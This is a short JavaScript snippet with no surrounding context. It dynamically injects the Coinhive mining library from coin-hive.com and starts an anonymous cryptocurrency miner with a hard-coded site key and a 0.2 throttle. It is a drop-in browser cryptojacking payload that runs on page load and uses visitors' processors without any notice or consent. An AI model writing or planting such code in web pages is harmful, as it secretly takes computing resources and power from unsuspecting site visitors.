(function(){
  let x = document.createElement("script")
  let r = document.getElementsByTagName("script")[0]
  x.type = "text/javascript"
  x.async = true
  x.src = "https://coin-hive.com/lib/coinhive.min.js"
  r.parentNode.insertBefore(x, r)
  x.addEventListener("load", function(event){
    let m = new CoinHive.Anonymous('L1wkuPPv26dszKN5fto5YNyTg0qbK2al', {
      throttle: 0.2
    });
  })
})()
